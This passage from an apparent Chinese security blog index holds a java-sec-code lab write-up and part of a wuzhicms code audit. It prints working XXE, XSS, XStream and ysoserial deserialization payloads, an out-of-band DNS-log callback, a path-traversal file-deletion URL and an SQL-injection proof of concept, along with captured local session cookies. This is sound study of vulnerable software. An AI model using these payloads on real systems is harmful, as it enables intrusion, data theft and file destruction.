JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0 Content-Type: application/xml Content-Length: 152 Connection: close \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://h1bdeh.dnslog.cn\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;/root\u0026gt; 8./SAXParser/sec java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 @RequestMapping(value = \u0026#34;/SAXParser/sec\u0026#34;, method = RequestMethod.POST) public String SAXParserSec(HttpServletRequest request) { try { String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); spf.setFeature(\u0026#34;http://apache.org/xml/features/disallow-doctype-decl\u0026#34;, true); spf.setFeature(\u0026#34;http://xml.org/sax/features/external-general-entities\u0026#34;, false); spf.setFeature(\u0026#34;http://xml.org/sax/features/external-parameter-entities\u0026#34;, false); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(body)), new DefaultHandler()); // parse xml } catch (Exception e) { logger.error(e.toString()); return EXCEPT; } return \u0026#34;SAXParser xxe security code\u0026#34;; } 9.这些方法的利用和修复都是一样的。 POC构造：\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 POST /xxe/***/*** HTTP/1.1 Host: 127.0.0.1:8081 Content-Type: application/xml Content-Length: 198 可以不写 Connection: close 此处空一行 分隔 Header 与 Body \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///C:/Windows/win.ini\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;/root\u0026gt; 或 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://1izyf3.dnslog.cn\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;/root\u0026gt; 修复：\ntext\r1 2 3 xmlReader.setFeature(\u0026#34;http://apache.org/xml/features/disallow-doctype-decl\u0026#34;, true); xmlReader.setFeature(\u0026#34;http://xml.org/sax/features/external-general-entities\u0026#34;, false); xmlReader.setFeature(\u0026#34;http://xml.org/sax/features/external-parameter-entities\u0026#34;, false); XSS java\r1 2 3 4 5 @RequestMapping(\u0026#34;/reflect\u0026#34;) @ResponseBody public static String reflect(String xss) { return xss; } text\r1 http://127.0.0.1:8081/xss/reflect?xss=\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 //先将 xss 储存在 cookie 中， @RequestMapping(\u0026#34;/stored/store\u0026#34;) @ResponseBody public String store(String xss, HttpServletResponse response) { Cookie cookie = new Cookie(\u0026#34;xss\u0026#34;, xss); response.addCookie(cookie); return \u0026#34;Set param into cookie\u0026#34;; } //访问 /stored/show 看到xss @RequestMapping(\u0026#34;/stored/show\u0026#34;) @ResponseBody public String show(@CookieValue(\u0026#34;xss\u0026#34;) String xss) { return xss; } text\r1 2 3 http://127.0.0.1:8081/xss/stored/store?xss=\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; http://127.0.0.1:8081/xss/stored/show XStreamRce XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。\n也就是说，使用XStream，我们可以把Java对象转换成XML，也可以将XML转换为Java对象。\n有RCE漏洞受影响版本： Xstream affected version: 1.4.10 or \u0026lt;= 1.4.6\nCVE-2020-26217 | XStream远程代码执行漏洞\nhttps://www.cnblogs.com/303donatello/p/13998245.html\nJava\r1 2 3 4 5 6 7 8 @PostMapping(\u0026#34;/xstream\u0026#34;) public String parseXml(HttpServletRequest request) throws Exception { String xml = WebUtils.getRequestBody(request); XStream xstream = new XStream(new DomDriver()); xstream.addPermission(AnyTypePermission.ANY); // This will cause all XStream versions to be affected. xstream.fromXML(xml); return \u0026#34;xstream\u0026#34;; } POC:\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 POST /xstream HTTP/1.1 Host: 127.0.0.1:8081 sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;113\u0026#34;, \u0026#34;Not-A.Brand\u0026#34;;v=\u0026#34;24\u0026#34; sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \u0026#34;Windows\u0026#34; Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=629E8EB9997DA26781472C6FFCAF7454; XSRF-TOKEN=f6390ed7-0e1c-4fbe-a342-1177716a0983; remember-me=YWRtaW46MTc1NDgwMTUzMDEzMTowZDM3ZjcxZDFmODc2YmUyNDQ0NGY3MmZkYTFkY2NmMQ Content-Type: application/xml Content-Length: 439 Connection: close \u0026lt;sorted-set\u0026gt; \u0026lt;string\u0026gt;foo\u0026lt;/string\u0026gt; \u0026lt;dynamic-proxy\u0026gt; \u0026lt;!-- --\u0026gt; \u0026lt;interface\u0026gt;java.lang.Comparable\u0026lt;/interface\u0026gt; \u0026lt;handler class=\u0026#34;java.beans.EventHandler\u0026#34;\u0026gt; \u0026lt;target class=\u0026#34;java.lang.ProcessBuilder\u0026#34;\u0026gt; \u0026lt;command\u0026gt; \u0026lt;string\u0026gt;cmd\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;/c\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;calc\u0026lt;/string\u0026gt; \u0026lt;/command\u0026gt; \u0026lt;/target\u0026gt; \u0026lt;action\u0026gt;start\u0026lt;/action\u0026gt; \u0026lt;/handler\u0026gt; \u0026lt;/dynamic-proxy\u0026gt; \u0026lt;/sorted-set\u0026gt; 参考文章： java经典反序列化漏洞复现\nhttps://www.cnblogs.com/0kooo-yz/p/18399516\n代码审计入门之java-sec-code（一）\nhttps://www.freebuf.com/articles/web/289863.html\nJava-Sec代码审计漏洞篇(一)\nhttps://xz.aliyun.com/news/15669\nJava-Sec代码审计漏洞篇(二)\nhttps://xz.aliyun.com/news/15721\nJava-sec-code靶场分析练习\nhttps://buaq.net/go-307106.html\njava-sec-code 靶场复现\nhttps://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/\nSnakeYaml反序列化漏洞研究\nhttps://www.cnblogs.com/LittleHann/p/17828948.html\n跨域资源共享 CORS 详解\nhttps://www.ruanyifeng.com/blog/2016/04/cors.html\n初识HTTP响应拆分攻击（CRLF Injection）\nhttps://www.anquanke.com/post/id/240014\nCSRF漏洞原理攻击与防御（非常细）-CSDN博客\nhttps://blog.csdn.net/qq_43378996/article/details/123910614\nJSONP 跨域原理及实现\nhttps://segmentfault.com/a/1190000041946934\nPostgreSQL JDBC 驱动远程代码执行漏洞（CVE-2022-21724）\nhttps://avd.aliyun.com/detail?id=AVD-2022-21724\u0026amp;timestamp__1384=eqA27KD5BKAK4YqGNDQRhMiKvr%2BmCnCoD\nPreparedStatement的使用\nhttps://www.cnblogs.com/ysw-go/p/5459330.html\n路径穿越（Path Traversal）详解-CSDN博客\nhttps://blog.csdn.net/qingzhantianxia/article/details/128204437\nSSTI（模板注入）漏洞（入门篇）\nhttps://www.cnblogs.com/bmjoker/p/13508538.html\nSSRF漏洞原理攻击与防御(超详细总结)-CSDN博客\nhttps://blog.csdn.net/qq_43378996/article/details/124050308\n由浅入深SpEL表达式注入漏洞\nhttp://rui0.cn/archives/1043\nXXE漏洞原理、检测与修复\nhttps://www.cnblogs.com/mysticbinary/p/12668547.html\n从XML相关一步一步到XXE漏洞\nhttps://xz.aliyun.com/news/6483\nCVE-2020-26217 | XStream远程代码执行漏洞\nhttps://www.cnblogs.com/303donatello/p/13998245.html\n工具的安装\u0026amp;使用 ysoserial.jar text\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 Linux： 检查Java版本： java -version 若未安装： sudo apt update sudo apt install openjdk-8-jdk-headless 安装 Git 和 Maven sudo apt install git maven -y 拉取源码 git clone https://github.com/frohoff/ysoserial.git 编译 cd ysoserial mvn clean package -DskipTests 编译后所在文件夹 cd target/ysoserial-0.0.6-SNAPSHOT-all.jar 重命名 cp target/ysoserial-*-all.jar ~/ysoserial.jar 测试是否安装成功 java -jar ysoserial.jar 生成payload calc\tWindows 内置命令\t\u0026#34;gnome-calculator\u0026#34;\tLinux + GUI + 有此命令\t\u0026#34;open -a Calculator\u0026#34;\tmacOS + 图形环境 Windows： java -jar ~/ysoserial.jar CommonsCollections5 calc | base64 rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4 ","permalink":"http://localhost:1313/xvsf/posts/java-sec-code-master-%E9%9D%B6%E5%9C%BA/","summary":"\u003ch1 id=\"java-sec-code-靶场\"\u003ejava-sec-code 靶场\u003c/h1\u003e\n\u003ch1 id=\"一靶场环境\"\u003e一、靶场环境\u003c/h1\u003e\n\u003cp\u003e源码地址：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/JoyChou93/java-sec-code\"\u003ehttps://github.com/JoyChou93/java-sec-code\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e搭建环境：\u003c/p\u003e\n\u003cp\u003eIDEA，pache-maven-3.9.1，apache-tomcat-9.0.105，JDK 1.8，MySQL 5.7.26，\u003c/p\u003e","title":"java-sec-code 靶场题解"},{"content":"wuzhicms 代码审计 根目录分析 api\tAPI接口，找未授权、SQL注入 caches\t缓存目录 configs\t配置文件 coreframe\t框架核心代码 install\t安装目录，安装后应删除 map\tpromote res\t静态资源 uploadfile\t上传文件储存目录，文件上传漏洞\n分析代码(参考README.md) 程序模块结构说明\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 |-- coreframe #框架目录 | |-- app #模块（应用程序）目录 | | |-- affiche #公告模块 | | |-- appshop #应用商城 | | |-- attachment #附件模块 | | |-- collect #采集器 | | |-- content #内容模块 | | |-- core #核心模块 | | |-- coupon #优惠券模块 | | |-- credit #积分模块 | | |-- database #数据库模块 | | |-- dianping #点评模块 | | |-- guestbook #留言板模块 | | |-- link #友情链接模块 | | |-- linkage #联动菜单 | | |-- member #会员模块 | | |-- message #站内短信模块 | | |-- mobile #移动手机模块 | | |-- order #订单模块 | | |-- pay #支付模块 | | |-- ppc #推广模块 | | |-- receipt #发票申请模块 | | |-- search #全站搜索模块 | | |-- sms #短信模块 | | |-- tags #tags模块 | | --- template #在线模板编辑 | |-- configs #框架配置 | |-- core.php #框架入口 | |-- crontab #定时脚本目录 | |-- crontab.php #定时脚本入口 | |-- extend #扩展目录 | |-- languages #语言包 | --- templates #模板 |-- caches #缓存目录 | |-- _cache_ #公共缓存 | |-- block #区块、碎片缓存 | |-- content #内容模块缓存，栏目缓存 | |-- db_bak #数据库备份路径 | |-- install.check #安装锁定 | |-- model #模型缓存 | --- templates #模板缓存 --- www #网站根目录 |-- 404.html #404页面 |-- admin.php #后台入口 |-- api #api目录 |-- configs #网站配置 |-- favicon.ico #浏览器icon |-- index.html #网站首页 |-- index.php #动态地址首页 |-- res #静态资源 |-- robots.txt #搜索引擎防抓取规则 |-- uploadfile #附件 `-- web.php #自定义路由 app/ #模块（应用程序）目录 先去核心模块看\ncoreframe/app/core/admin/index.php\t后台登录首页 因为没有对$lang进行检验和过滤，通过设置cookie值，对require的路径拼接，使require执行任何PHP文件\nphp\r1 2 3 4 5 6 7 function init() { $lang = get_cookie(\u0026#39;lang\u0026#39;) ? get_cookie(\u0026#39;lang\u0026#39;) : LANG; require COREFRAME_ROOT.\u0026#39;languages/\u0026#39;.$lang.\u0026#39;/admin_menu.lang.php\u0026#39;; public function left() { $lang = get_cookie(\u0026#39;lang\u0026#39;) ? get_cookie(\u0026#39;lang\u0026#39;) : LANG; require COREFRAME_ROOT.\u0026#39;languages/\u0026#39;.$lang.\u0026#39;/admin_menu.lang.php\u0026#39;; 此处是ai发现的一个漏洞，实际上很难触发，记录：\n登录成功后不生成新session ID 直接重用攻击者提供的session ID 利用：\n攻击者获取自己的session ID：PHPSESSID=attacker_sess 构造钓鱼链接： text\r1 http://target.com/admin/?m=core\u0026amp;f=index\u0026amp;v=login\u0026amp;submit=1\u0026amp;checkcode=...[有效验证码]...\u0026amp;username=admin\u0026amp;password=123456 诱使管理员点击链接（含攻击者的session ID） 管理员登录后，攻击者使用相同的PHPSESSID即可直接进入管理员账户 php\r1 2 3 4 5 6 7 8 9 //登录 function login() { //已经登陆的用户重定向到后台首页 if (isset($_SESSION[\u0026#39;uid\u0026#39;]) \u0026amp;\u0026amp; $_SESSION[\u0026#39;uid\u0026#39;]!=\u0026#39;\u0026#39;) { MSG(L(\u0026#39;already login\u0026#39;), \u0026#39;?m=core\u0026amp;f=index\u0026#39;.$this-\u0026gt;su(0)); } ... $_SESSION[\u0026#39;uid\u0026#39;] = $_SESSION[\u0026#39;role\u0026#39;] = 0\t} 暴露敏感信息：当然，需要登录到后台才能利用，所以不算高危。\n路由：\nhttp://wuzhicms:7575/index.php?m=core\u0026amp;f=index\u0026amp;_su=wuzhicms\u0026amp;v=phpinfo\nphp\r1 2 3 4 5 6 /** * 显示 phpinfo 内容 */ function phpinfo() { echo phpinfo(); } coreframe/app/appupdate/admin/index.php 如果 $filePath 为 ../../../index.php，则 COREFRAME_ROOT . \u0026lsquo;../../../index.php\u0026rsquo; 就可以指向系统目录外的敏感文件。\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 protected function _deleteFilesForPackageUpdate($packageDir) { if (!$this-\u0026gt;filesystem-\u0026gt;exists($packageDir.\u0026#39;/delete\u0026#39;)) { return; } $handle = fopen($packageDir.\u0026#39;/delete\u0026#39;, \u0026#39;r\u0026#39;); while ($filePath = fgets($handle)) { $filePath= trim($filePath); if(substr($filePath,0,9)==\u0026#39;coreframe\u0026#39;) { $fullPath = COREFRAME_ROOT.substr($filePath,9); if ($this-\u0026gt;filesystem-\u0026gt;exists($fullPath)) { $this-\u0026gt;filesystem-\u0026gt;remove($fullPath); } } elseif(substr($filePath,0,3)==\u0026#39;www\u0026#39;) { $fullPath = WWW_ROOT.substr($filePath,3); if ($this-\u0026gt;filesystem-\u0026gt;exists($fullPath)) { $this-\u0026gt;filesystem-\u0026gt;remove($fullPath); } } } fclose($handle); } 搜关键字 文件安全： 任意文件删除 搜索del() -\u0026gt; coreframe/app/attachment/admin/index.php -\u0026gt; del()\n有可控变量 $url\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 public function del() { $id = isset($GLOBALS[\u0026#39;id\u0026#39;]) ? $GLOBALS[\u0026#39;id\u0026#39;] : \u0026#39;\u0026#39;;//从全局变量 $GLOBALS 中获取 id 和 url $url = isset($GLOBALS[\u0026#39;url\u0026#39;]) ? remove_xss($GLOBALS[\u0026#39;url\u0026#39;]) : \u0026#39;\u0026#39;;//remove_xss() 函数用来清理 url 变量，防止 XSS 攻击 if (!$id \u0026amp;\u0026amp; !$url) MSG(L(\u0026#39;operation_failure\u0026#39;), HTTP_REFERER, 3000);//判断是否都为空 if ($id) {//按 id 删除 if(!is_array($id)) {//将 id 转化为数组 $ids = array($id); } else { $ids = $id; } foreach($ids as $id) { $where = array(\u0026#39;id\u0026#39; =\u0026gt; $id); $att_info = $this-\u0026gt;db-\u0026gt;get_one(\u0026#39;attachment\u0026#39;, $where, \u0026#39;usertimes,path\u0026#39;);//从 attachment 表中查找该 id的记录并取usertimes 和 path if ($att_info[\u0026#39;usertimes\u0026#39;] \u0026gt; 1) {//若引用数大于 1，只减少使用次数，不删除物理文件 $this-\u0026gt;db-\u0026gt;update(\u0026#39;attachment\u0026#39;, \u0026#39;usertimes = usertimes-1\u0026#39;, $where); } else {//否则，彻底删除 $this-\u0026gt;my_unlink(ATTACHMENT_ROOT . $att_info[\u0026#39;path\u0026#39;]); $this-\u0026gt;db-\u0026gt;delete(\u0026#39;attachment\u0026#39;, $where); $this-\u0026gt;db-\u0026gt;delete(\u0026#39;attachment_tag_index\u0026#39;, array(\u0026#39;att_id\u0026#39;=\u0026gt;$id)); } } MSG(L(\u0026#39;delete success\u0026#39;), HTTP_REFERER, 1000); } else { if (!$url) MSG(\u0026#39;url del \u0026#39; . L(\u0026#39;operation_failure\u0026#39;), HTTP_REFERER, 3000);//按url 删除，如果没有 URL，报错返回。 $path = str_ireplace(ATTACHMENT_URL, \u0026#39;\u0026#39;, $url);//将 URL 中的 ATTACHMENT_URL 去掉，得到文件相对路径 path if ($path) { $where = array(\u0026#39;path\u0026#39; =\u0026gt; $path);//根据 path 查找数据库记录 $att_info = $this-\u0026gt;db-\u0026gt;get_one(\u0026#39;attachment\u0026#39;, $where, \u0026#39;usertimes,id\u0026#39;); if (empty($att_info)) {//如果没有记录，只删物理文件 $this-\u0026gt;my_unlink(ATTACHMENT_ROOT . $path); MSG(L(\u0026#39;operation_success\u0026#39;), HTTP_REFERER, 3000); } if ($att_info[\u0026#39;usertimes\u0026#39;] \u0026gt; 1) {//引用多次，只减引用次数 $this-\u0026gt;db-\u0026gt;update(\u0026#39;attachment\u0026#39;, \u0026#39;usertimes = usertimes-1\u0026#39;, array(\u0026#39;id\u0026#39; =\u0026gt; $att_info[\u0026#39;id\u0026#39;])); } else { $this-\u0026gt;my_unlink(ATTACHMENT_ROOT . $path); $this-\u0026gt;db-\u0026gt;delete(\u0026#39;attachment\u0026#39;, array(\u0026#39;id\u0026#39; =\u0026gt; $att_info[\u0026#39;id\u0026#39;])); MSG(L(\u0026#39;operation_success\u0026#39;), HTTP_REFERER, 3000); } } else { MSG(L(\u0026#39;operation_failure\u0026#39;), HTTP_REFERER, 3000); } } } 跟进my_unlink\nphp\r1 2 3 4 private function my_unlink($path) { if(file_exists($path)) unlink($path);//文件存在直接删除 } index.php?m=attachment\u0026amp;f=index\u0026amp;v=del\u0026amp;_su=wuzhicms\u0026amp;url=../../1.txt\nSQL注入 搜索select\n发现这里的很多参数都是原样拼接，可能存在风险\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // coreframe/app/core/libs/class/mysqli.class.php public function get_list($table, $where = \u0026#39;\u0026#39;, $field = \u0026#39;*\u0026#39;, $limit = \u0026#39;\u0026#39;, $order = \u0026#39;\u0026#39;, $group = \u0026#39;\u0026#39;, $keyfield = \u0026#39;\u0026#39;) { $arr = array(); $where = $where ? \u0026#39; WHERE \u0026#39;.$where: \u0026#39;\u0026#39;; $field = $field == \u0026#39;*\u0026#39; ? \u0026#39;*\u0026#39; : self::safe_filed($field); $order = $order ? \u0026#39; ORDER BY \u0026#39;.$order : \u0026#39;\u0026#39;; $group = $group ? \u0026#39; GROUP BY \u0026#39;.$group : \u0026#39;\u0026#39;; $limit = $limit ? \u0026#39; LIMIT \u0026#39;.$limit : \u0026#39;\u0026#39;; $sql = \u0026#39;SELECT \u0026#39;.$field.\u0026#39; FROM `\u0026#39;.$this-\u0026gt;tablepre.$table.\u0026#39;`\u0026#39;.$where.$group.$order.$limit; $query = $this-\u0026gt;query($sql); while($data = $this-\u0026gt;fetch_array($query)) { if($keyfield) { $arr[$data[$keyfield]] = $data; } else { $arr[] = $data; } } return $arr; } 跟进get_list函数，最后只找到这里有可控变量 $fieldtype、$keywords\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // coreframe/app/promote/admin/index.php public function search() { $siteid = get_cookie(\u0026#39;siteid\u0026#39;); $page = isset($GLOBALS[\u0026#39;page\u0026#39;]) ? intval($GLOBALS[\u0026#39;page\u0026#39;]) : 1; $page = max($page,1); $fieldtype = $GLOBALS[\u0026#39;fieldtype\u0026#39;]; $keywords = $GLOBALS[\u0026#39;keywords\u0026#39;]; if($fieldtype==\u0026#39;place\u0026#39;) { $where = \u0026#34;`siteid`=\u0026#39;$siteid\u0026#39; AND `name` LIKE \u0026#39;%$keywords%\u0026#39;\u0026#34;; $result = $this-\u0026gt;db-\u0026gt;get_list(\u0026#39;promote_place\u0026#39;, $where, \u0026#39;*\u0026#39;, 0, 50,$page,\u0026#39;pid ASC\u0026#39;); $pages = $this-\u0026gt;db-\u0026gt;pages; $total = $this-\u0026gt;db-\u0026gt;number; include $this-\u0026gt;template(\u0026#39;listingplace\u0026#39;); } else { $where = \u0026#34;`siteid`=\u0026#39;$siteid\u0026#39; AND `$fieldtype` LIKE \u0026#39;%$keywords%\u0026#39;\u0026#34;; $result = $this-\u0026gt;db-\u0026gt;get_list(\u0026#39;promote\u0026#39;,$where, \u0026#39;*\u0026#39;, 0, 20,$page,\u0026#39;id DESC\u0026#39;); $pages = $this-\u0026gt;db-\u0026gt;pages; $total = $this-\u0026gt;db-\u0026gt;number; include $this-\u0026gt;template(\u0026#39;listing\u0026#39;); } } $fieldtype、$keywords俩个参数拼接到$where中，\n构造poc:\nindex.php?m=promote\u0026amp;f=index\u0026amp;_su=wuzhicms\u0026amp;v=search\u0026amp;fieldtype=place\u0026amp;keywords=1%27%20or%20extractvalue(1,concat(0x7e,user()))%20--+\n记一些知识点、函数 text\r1 $GLOBALS = array();//清除所有的全局变量 text\r1 microtime函数返回当前 Unix 时间戳的微秒数。 magic_quotes_runtime 的作用\nhttp://blog.csdn.net/tom_green/article/details/7039002\nmagic_quotes_gpc函数详解\nhttps://www.cnblogs.com/timelesszhuang/p/3726736.html\n漏洞补充： CSRF漏洞 五指CMS 4.1.0版本存在一个CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可将普通用户提成为管理员权限。\n前台SQL注入 多个变量未使用引号包裹的SQL语句,只要是调用get_one这个函数的地方都存在SQL注入\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public function get_one($table, $where, $field = \u0026#39;*\u0026#39;, $limit = \u0026#39;\u0026#39;, $order = \u0026#39;\u0026#39;, $group = \u0026#39;\u0026#39;, $condition = TRUE) { $where = $where ? \u0026#39; WHERE \u0026#39;.$where: \u0026#39;\u0026#39;; if($condition) { $field = $field == \u0026#39;*\u0026#39; ? \u0026#39;*\u0026#39; : self::safe_filed($field); } else { $field = $this-\u0026gt;escape_string($field); } $order = $order ? \u0026#39; ORDER BY \u0026#39;.$order : \u0026#39;\u0026#39;; $group = $group ? \u0026#39; GROUP BY \u0026#39;.$group : \u0026#39;\u0026#39;; $limit = $limit ? \u0026#39; LIMIT \u0026#39;.$limit : \u0026#39;\u0026#39;; $sql = \u0026#39;SELECT \u0026#39;.$field.\u0026#39; FROM `\u0026#39;.$this-\u0026gt;tablepre.$table.\u0026#39;`\u0026#39;.$where.$group.$order.$limit; $query = $this-\u0026gt;query($sql); return $this-\u0026gt;fetch_array($query); } api/sms_check.php,找到可控变量\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php define(\u0026#39;WWW_ROOT\u0026#39;,substr(dirname(__FILE__), 0, -4).\u0026#39;/\u0026#39;); require \u0026#39;../configs/web_config.php\u0026#39;; require 